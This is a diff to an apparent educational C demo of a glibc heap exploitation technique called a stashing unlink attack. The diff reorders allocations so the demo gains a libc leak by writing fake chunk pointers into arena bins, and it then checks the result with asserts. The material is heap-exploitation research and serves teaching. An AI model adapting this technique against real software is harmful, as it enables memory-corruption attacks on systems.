@@ -9,7 +9,7 @@
  * detailed explanation of the stashing unlink attack 
  * the core mechanism behind this , along with how this
  * technique expands on and test environements/build scripts 
- * for all * the mentioned versions it is at :
+ * for all the mentioned versions it is at :
  *
  * https://github.com/tabacc0/HeapResearch
 */
@@ -77,10 +77,7 @@ int main(){
 	printf("\n3) a place in memory to construct a fake list , it can be\n");
 	printf("   a heap chunk which we know the address of because of the\n");
 	printf("   required heap leak\n");
-	printf("\n4) being able to allocate 8 chunks for doing the attack , on its own\n");
-	printf("   it gives a libc leak and the ability to write to a certain\n");
-	printf("   number of arena bins\n");
-	printf("\n5) additional allocations to control further libc space\n\n");
+	printf("\n5) ablity to allocate a certain ammount of chunks\n\n");
 
 	//the smallbin chunk we will overwrite the bk of
 	//to avoid having to fill/empty tcache we allocate a large
@@ -97,6 +94,15 @@ int main(){
 	printf("\n\nAllocating a tache_chunk of victim size + 0x10\n");
 	printf("\n\nwe will overwrite this chunk in its tcache entry with the smallbin address\n");
 	char *tcache_chunk = malloc(ALLOC_SIZE+0x10);
+
+	//allocating the chunk whose bin we use to get a leak
+	printf("\n\nAllocating a large chunk , we will use the same trimming trick\n");
+	printf("to put this chunk in the exact smallbin we will allocate at in the arena\n");
+	printf("this chunk will  be used to obtain a leak when we control bins in the arena , we\n");
+	printf("call it freed the trimming result is ALLOC_SIZE-0x10 , which corresponds to the\n");
+	printf("smallbin we land on when allocating in the arena\n");
+	char *freed = malloc(0x410+ALLOC_SIZE-0x10);
+
 	//to avoid consolidation with top
 	printf("\n\nAllocating a guard chunk to avoid consolidatin with the top chunk\n");
 	char *guard = malloc(0x1000);
@@ -122,32 +128,21 @@ int main(){
 	char **victim_chunk = (char **)victim-2;
 
 
-	//allocating the chunk whose bin we use to get a leak
-	printf("\n\nAllocating a large chunk , we will use the same trimming trick\n");
-	printf("to put this chunk in a smallbin ahead of victim's, this chunk will\n");
-	printf("be used to obtain a leak when we control bins in the arena , we call it freed\n");
-	printf("the trimming result is slightly larger larger then victim so its bin lands\n");
-	printf("slightly ahead of victim's");
-	char *freed = malloc(0x410+ALLOC_SIZE+0x20);
-	//sort victim into the small bin
-	//this progression bypasses filling the tcache 
-	//so 6 less allocations
-	printf("\n\nAllocating a large chunk to sort victim into a smallbin\n");
-	void *sort = malloc(0x1000);
 
-	//keep the address of the smallbin for later sanity check
-	char *smallbin = victim_chunk[3];
 
 	//free freed
 	printf("\n\nfreeing freed , it will be put in the unsorted bin\n");
 	free(freed);
 	//allocating a trimming chunk to make freed of size ALLOC_SIZE + 0x20
 	printf("\n\nAllocating a large chunk to trim freed into the approprite size\n");
+	printf("this also sorts victim to its correponding smallbin\n");
 	char *trim_freed = malloc(0x400);
+	//keep the address of the smallbin for later sanity check
+	char *smallbin = victim_chunk[3];
 	printf("\n\nUpdating the freed pointer , since it advanced by 0x410\n");
 	freed += 0x410;
 	//freed including metadata
-	printf("\n\nInitializing victim_chunk with victim - 0x10 bytes to account for metadata\n");
+	printf("\n\nInitializing freed_chunk with chunk - 0x10 bytes to account for metadata\n");
 	char **freed_chunk = (char **)freed-2;
 
 	printf("\n\nAllocating a large chunk to sort freed into a smallbin\n");
@@ -216,18 +211,18 @@ int main(){
 	printf("memset(allocated,0,ALLOC_SIZE+0x10);");
 	memset(allocated,0,ALLOC_SIZE+0x10);
 	printf("\n\nUsing our write access we write the address of freed (which we can\n");
-	printf("calclulate with the heap leak), in its smallbin which is ahead of the bin\n");
-	printf("we allocated\n");
-	allocated[6] = allocated[7] = (char *)freed_chunk;
+	printf("calclulate with the heap leak), in its smallbin which is the exact bin\n");
+	printf("we allocated at in the arena\n");
+	allocated[0] = allocated[1] = (char *)freed_chunk;
 	printf("\n\nthe freed chunk was previously freed and it holds the correct links\n");
 	printf("for its bin , now that we have written it back during out initialization\n");
 	printf("of the allocated chunk in the arena, if we allocate the exact size \n");
 	printf("corresponding to freed , we will allocated it , and the bin links will be\n");
 	printf("written back into its bin , which is within our read reach\n");
-	char *trigger_leak = malloc(ALLOC_SIZE+0x20);
+	char *trigger_leak = malloc(ALLOC_SIZE-0x10);
 	//READING LEAK , ASSUMING READ CAPABILITY TO CHUNK
-	printf("\nchar *leak = allocated[7];\n");
-	char *leak = allocated[7];
+	printf("\nchar *leak = allocated[0];\n");
+	char *leak = allocated[0];
 	
 	//the leak has the address of the bin immediately before
 	printf("\nsanity check : \n");
@@ -310,7 +305,4 @@ int main(){
 	printf("assert((long)expand > (long) stdout);\n");
 	assert((long)expand > (long) stdout);
 	printf("passed!\n");
-	printf("congratz!\n");
-
-
 }
